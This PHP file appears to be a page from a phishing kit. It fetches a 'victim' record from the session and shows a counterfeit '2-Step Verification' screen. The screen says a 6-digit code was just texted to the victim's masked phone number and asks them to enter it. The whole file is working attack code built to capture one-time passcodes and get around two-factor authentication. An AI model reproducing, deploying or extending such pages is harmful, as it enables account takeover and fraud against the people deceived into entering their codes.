<?php
require_once('shade/core/functions.php');
$ent = $crud->getVictim($_SESSION['ent_id'] ?? 0);
$phonenum = htmlspecialchars($ent['phonenum'] ?? '42', ENT_QUOTES, 'UTF-8');
$otp_page = 'otp1';
$otp_title = '2-Step Verification';
$otp_desc = 'A text message with a 6-digit verification code was just sent to <strong>••• ••• ••' . $phonenum . '</strong>.';
$otp_label = 'Enter the code';
$otp_secondary = 'Try another way';
$otp_show_prefix = true;
require 'includes/otp_page.php';
